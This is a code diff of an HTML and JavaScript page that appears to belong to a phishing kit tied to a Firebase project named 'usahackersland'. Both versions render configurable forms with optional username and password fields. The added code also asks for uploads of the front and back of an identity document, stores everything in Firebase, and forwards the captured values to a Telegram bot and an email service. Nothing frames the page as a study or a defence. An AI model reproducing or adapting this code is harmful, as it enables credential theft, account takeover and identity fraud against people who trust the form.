@@ -2,270 +2,192 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<meta name="description" id="metaDesc" content="Loading...">
-
-<!-- Open Graph -->
-<meta property="og:title" id="ogTitle" content="Loading...">
-<meta property="og:description" id="ogDesc" content="Loading...">
-<meta property="og:image" id="ogImage" content="">
-<meta property="og:url" content="">
-<meta property="og:type" content="website">
-
-<style>
-body{
-  font-family: Arial, sans-serif;
-  background:#f4f6f8;
-  padding:20px;
-  transition: background 0.5s;
-}
-
-#formContainer{
-  max-width:600px;
-  margin:auto;
-  background:#fff;
-  padding:20px;
-  border-radius:10px;
-  box-shadow:0 0 10px rgba(0,0,0,0.1);
-  transition: background 0.5s;
-}
-
-.builder-media{
-  text-align:center;
-  margin-bottom:12px;
-}
-.builder-media img, .builder-media video{
-  max-width:140px;
-  height:auto;
-  margin-bottom:8px;
-  transition: all 0.5s;
-}
-
-h2{
-  text-align:center;
-  margin:10px 0;
-}
-#formDesc{
-  text-align:center;
-  margin-bottom:12px;
-}
-
-#failureWarning{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:4px;
-}
-#submitResult{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:10px;
-  opacity:0;
-  transition:opacity 0.5s;
-}
-
-input, textarea, button{
-  width:100%;
-  padding:10px;
-  margin:8px 0;
-  border-radius:6px;
-  border:1px solid #ccc;
-  box-sizing:border-box;
-}
-
-button{
-  cursor:pointer;
-  background:#1976d2;
-  color:#fff;
-  border:none;
-}
-
-.embedLink{
-  margin-top:6px;
-  padding:6px;
-  background:#e8f0fe;
-  border-radius:6px;
-  word-break:break-all;
-}
-</style>
-
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Form</title>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<style>
+  body { font-family: Arial, sans-serif; margin:0; padding:0; }
+  #formContainer { position: relative; width:100%; min-height:100vh; padding:20px; box-sizing:border-box; overflow:auto; }
+  .livePreviewContent { position: relative; z-index:1; max-width:700px; margin:auto; }
+  .livePreviewContent img { max-width:100%; margin:6px 0; border-radius:6px; }
+  .livePreviewContent video { width:100%; border-radius:6px; margin:6px 0; }
+  .draggableBtn { position:absolute; cursor:pointer; border:none; border-radius:8px; color:#fff; text-align:center; display:flex; align-items:center; justify-content:center; font-size:14px; z-index:2; }
+  .embedLink { margin-top:6px; padding:6px; background:#e8f0fe; border-radius:6px; word-break:break-word; }
+</style>
 </head>
 <body>
-<div id="formContainer">
-  <div id="imageContainer" class="builder-media"></div>
-  <h2 id="formTitle">Loading...</h2>
-  <div id="formDesc"></div>
-  <div id="failureWarning"></div>
-  <div id="submitResult">⚠️ Try Again</div>
-  <form id="dynamicForm"></form>
-  <div id="embedLinks"></div>
-</div>
+<div id="formContainer"></div>
 
 <script>
-const $ = id => document.getElementById(id);
-
-/* 🔥 SEO + OG */
-function applySEOMeta(config){
-  if(!config) return;
-  document.title = config.seoTitle || config.title || "Form";
-  document.querySelector('meta[name="description"]').setAttribute(
-    "content", config.metaDesc || config.description || ""
-  );
-  document.querySelector('meta[property="og:title"]').setAttribute(
-    "content", config.seoTitle || config.title || ""
-  );
-  document.querySelector('meta[property="og:description"]').setAttribute(
-    "content", config.metaDesc || config.description || ""
-  );
-  if(config.ogImage) document.querySelector('meta[property="og:image"]').setAttribute(
-    "content", config.ogImage
-  );
-  let ogUrlTag = document.querySelector('meta[property="og:url"]');
-  if (!ogUrlTag) {
-    ogUrlTag = document.createElement("meta");
-    ogUrlTag.setAttribute("property", "og:url");
-    document.head.appendChild(ogUrlTag);
-  }
-  ogUrlTag.setAttribute("content", window.location.href);
-}
-
-/* FIREBASE INIT */
-firebase.initializeApp({
+const firebaseConfig = {
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
-  projectId: "usahackersland"
-});
+  projectId: "usahackersland",
+  storageBucket: "usahackersland.appspot.com"
+};
+firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
+const storage = firebase.storage();
 
-/* PARAMS */
-const formId = new URLSearchParams(location.search).get("id");
-const formEl = $("dynamicForm");
-const imageContainer = $("imageContainer");
-const embedEl = $("embedLinks");
-const submitResult = $("submitResult");
-const failureWarning = $("failureWarning");
+// EmailJS initialization
+emailjs.init("YOUR_EMAILJS_USER_ID"); // <-- Replace
 
-if(!formId){
-  $("formTitle").innerText = "Form ID missing!";
+const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // <-- Replace
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // <-- Replace
+
+const getFormId = () => new URLSearchParams(window.location.search).get('id');
+
+function sendTelegramAlert(message){
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+  }).catch(err=>console.error("Telegram error:", err));
 }
 
-/* REAL-TIME FORM LISTENER */
-db.collection("forms").doc(formId)
-.onSnapshot(doc=>{
-  if(!doc.exists) {
-    $("formTitle").innerText = "Form not found!";
-    return;
-  }
-  const formConfig = doc.data();
-  applySEOMeta(formConfig);
-  renderForm(formConfig);
-});
-
-/* RENDER FORM */
-function renderForm(config){
-  $("formTitle").innerText = config.title || "";
-  $("formTitle").style.color = config.titleColor || "#000";
-  $("formDesc").innerText = config.description || "";
-  $("formDesc").style.color = config.textColor || "#444";
-
-  document.body.style.background = config.bgColor || "#f4f6f8";
-  if(config.bgImage){
-    document.body.style.backgroundImage = `url('${config.bgImage}')`;
-    document.body.style.backgroundSize = "cover";
-    document.body.style.backgroundRepeat = "no-repeat";
-  } else {
-    document.body.style.backgroundImage = "none";
-  }
-
-  imageContainer.innerHTML = "";
-  if(config.avatarURL) imageContainer.innerHTML += `<img src="${config.avatarURL}" style="width:90px;border-radius:50%">`;
-  if(config.logoURL) imageContainer.innerHTML += `<img src="${config.logoURL}">`;
-  if(Array.isArray(config.videos)) config.videos.forEach(v=>{
-    imageContainer.innerHTML += `<video controls src="${v}" style="max-width:100%;margin-bottom:8px;"></video>`;
-  });
-
-  failureWarning.innerText = (config.enableWarning && config.warning) ? config.warning : "";
-
-  formEl.innerHTML = "";
-  if(config.addAuth && config.usernamePlaceholder && config.passwordPlaceholder){
-    formEl.innerHTML += `
-      <input name="username" placeholder="${config.usernamePlaceholder}" required>
-      <input type="password" name="password" placeholder="${config.passwordPlaceholder}" required>
-    `;
-  }
-
-  if(Array.isArray(config.extraFields)){
-    config.extraFields.filter(f=>f && f.trim()!=="").forEach(f=>{
-      formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
-    });
-  }
-
-  if(config.showMainBtn && config.buttonText){
-    const btn = document.createElement("button");
-    btn.textContent = config.buttonText;
-    btn.style.background = config.btnColor || "#1976d2";
-    formEl.appendChild(btn);
-  }
-
-  embedEl.innerHTML = "";
-  if(Array.isArray(config.embedLinks)){
-    config.embedLinks.forEach(l=>{
-      if(!l || !l.show || !l.url) return;
-      embedEl.innerHTML += `
-        <div class="embedLink">
-          <strong>${l.text||""}</strong><br>
-          <a href="${l.url}" target="_blank">${l.url}</a>
-          ${l.desc? `<br><small>${l.desc}</small>` : ""}
-        </div>
-      `;
-    });
-  }
-
-  formEl.querySelectorAll("button").forEach(btn=> btn.onclick = e=>submitForm(e, config));
+function sendEmailAlert(subject, body){
+  emailjs.send("YOUR_EMAILJS_SERVICE_ID", "YOUR_EMAILJS_TEMPLATE_ID", {
+    subject: subject,
+    message: body
+  }).catch(err=>console.error("EmailJS error:", err));
 }
 
-/* SUBMIT FORM */
-function submitForm(e, config){
-  e.preventDefault();
-  const data = {};
-  formEl.querySelectorAll("input,textarea").forEach(i=>{
-    if(i.value.trim() !== "") data[i.name] = i.value;
-  });
+async function uploadFile(file){
+  const ref = storage.ref().child(`form_uploads/${Date.now()}_${file.name}`);
+  const snapshot = await ref.put(file);
+  return await snapshot.ref.getDownloadURL();
+}
 
-  db.collection("submissions").add({
-    formId,
-    data,
-    createdAt: new Date().toISOString()
-  });
+function renderForm(data) {
+  const container = document.getElementById("formContainer");
+  container.innerHTML = "";
+  container.style.backgroundColor = data.bgColor || "#fff";
+  container.style.backgroundImage = data.bgImageURL ? `url(${data.bgImageURL})` : "";
+  container.style.backgroundSize = data.bgSize || "cover";
+  container.style.backgroundPosition = "center";
+  container.style.position = "relative";
 
-  submitResult.style.opacity = 1;
-  setTimeout(()=>submitResult.style.opacity = 0, 3000);
-  formEl.reset();
+  const content = document.createElement("div");
+  content.className = "livePreviewContent";
+  content.style.color = data.textColor || "#222";
 
-  // Telegram alert
-  if(config.telegramBot && config.telegramChatID){
-    fetch(`https://api.telegram.org/bot${config.telegramBot}/sendMessage`, {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({
-        chat_id: config.telegramChatID,
-        text: `New form submission:\n${JSON.stringify(data)}`
-      })
+  content.innerHTML += `<h2 style="text-align:center;color:${data.titleColor||'#111'}">${data.title||''}</h2>`;
+
+  const fDiv = document.createElement("div");
+  fDiv.style.display="flex";
+  fDiv.style.flexDirection="column";
+  fDiv.style.alignItems = "center";
+  fDiv.style.gap="8px";
+
+  const formFields = [];
+
+  // Auth Fields
+  if(data.addAuth){
+    const usernameInput = document.createElement("input");
+    usernameInput.placeholder = data.usernamePlaceholder||'Username';
+    const passwordInput = document.createElement("input");
+    passwordInput.type = "password";
+    passwordInput.placeholder = data.passwordPlaceholder||'Password';
+    fDiv.appendChild(usernameInput);
+    fDiv.appendChild(passwordInput);
+    formFields.push({label:"Username", element:usernameInput});
+    formFields.push({label:"Password", element:passwordInput});
+  }
+
+  // Extra Fields
+  if(data.extraFields && data.extraFields.length){
+    data.extraFields.forEach(f=>{
+      if(f){
+        const input = document.createElement("input");
+        input.placeholder = f;
+        fDiv.appendChild(input);
+        formFields.push({label:f, element:input});
+      }
     });
   }
 
-  // Email alert
-  if(config.emailAlert){
-    fetch(config.emailAlert,{
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({formId: formId, data})
-    });
+  // File Upload Fields
+  const fileFields = [];
+  if(data.idFrontChk){
+    const input = document.createElement("input");
+    input.type = "file";
+    input.placeholder = data.idFrontText || "Upload Front ID";
+    fDiv.appendChild(input);
+    fileFields.push({label:data.idFrontText||"Front ID", element:input});
   }
+  if(data.idBackChk){
+    const input = document.createElement("input");
+    input.type = "file";
+    input.placeholder = data.idBackText || "Upload Back ID";
+    fDiv.appendChild(input);
+    fileFields.push({label:data.idBackText||"Back ID", element:input});
+  }
+
+  // Submit Button
+  const submitBtn = document.createElement("button");
+  submitBtn.textContent = data.buttonText || "Submit";
+  submitBtn.style.background = data.btnColor || "#1976d2";
+  submitBtn.style.color = "#fff";
+  submitBtn.style.padding = "10px";
+  submitBtn.style.border="none";
+  submitBtn.style.borderRadius="6px";
+
+  submitBtn.onclick = async ()=>{
+    submitBtn.disabled = true;
+    const formData = {};
+    formFields.forEach(f => formData[f.label] = f.element.value);
+
+    // Upload files
+    for(const f of fileFields){
+      if(f.element.files.length > 0){
+        const url = await uploadFile(f.element.files[0]);
+        formData[f.label] = url; // replace local file with URL
+      }
+    }
+
+    // Save to Firebase
+    db.collection("form_submissions").add({
+      formId: getFormId(),
+      data: formData,
+      timestamp: new Date()
+    }).then(()=>{
+      alert("Form submitted successfully!");
+
+      let alertMsg = `New Form Submission (ID: ${getFormId()}):\n` + 
+                     Object.entries(formData).map(([k,v])=>`${k}: ${v}`).join("\n");
+
+      sendTelegramAlert(alertMsg);
+      sendEmailAlert("New Form Submission", alertMsg);
+
+      submitBtn.disabled = false;
+    }).catch(err=>{
+      alert("Error submitting form: "+err);
+      submitBtn.disabled = false;
+    });
+  };
+  fDiv.appendChild(submitBtn);
+
+  content.appendChild(fDiv);
+  container.appendChild(content);
+}
+
+// Load form by ID
+const formId = getFormId();
+if(formId){
+  db.collection("forms").doc(formId).get().then(doc=>{
+    if(doc.exists){
+      const data = doc.data();
+      data.extraFields = data.extraFields || [];
+      renderForm(data);
+    } else {
+      document.getElementById("formContainer").innerHTML = "<p>Form not found.</p>";
+    }
+  });
+}else{
+  document.getElementById("formContainer").innerHTML = "<p>No form ID provided in URL.</p>";
 }
 </script>
 </body>
